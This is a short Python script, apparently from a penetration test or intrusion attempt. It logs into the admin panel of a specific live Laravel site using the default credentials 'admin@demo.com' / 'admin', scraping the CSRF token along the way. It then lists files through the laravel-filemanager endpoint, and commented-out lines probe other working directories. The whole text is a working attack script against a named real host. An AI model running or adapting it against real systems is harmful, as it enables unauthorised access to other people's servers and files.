import requests
import re
import json

# Target URL
BASE_URL = "http://ccw84s4g4cgsk440c0ssookc.72.62.122.96.sslip.io"
ADMIN_EMAIL = "admin@demo.com"
ADMIN_PASS = "admin"

session = requests.Session()

def login():
    try:
        r = session.get(f"{BASE_URL}/admin/login")
        csrf_token = re.search(r'name="_token" value="([^"]+)"', r.text).group(1)
        data = {"_token": csrf_token, "email": ADMIN_EMAIL, "password": ADMIN_PASS}
        r = session.post(f"{BASE_URL}/admin/login", data=data)
        return "/admin" in r.url or "/panel" in r.url
    except: return False

if login():
    print("[+] Logged in.")
    # List LFM items
    r = session.get(f"{BASE_URL}/laravel-filemanager/items?type=Files")
    print(f"[*] LFM Items (Type: Files):\n{r.text[:1000]}")
    
    # Try with a subfolder if possible
    # LFM usually uses 'working_dir' parameter
    # r = session.get(f"{BASE_URL}/laravel-filemanager/items?type=Files&working_dir=/1")
    # print(f"[*] LFM Items in /1:\n{r.text[:1000]}")
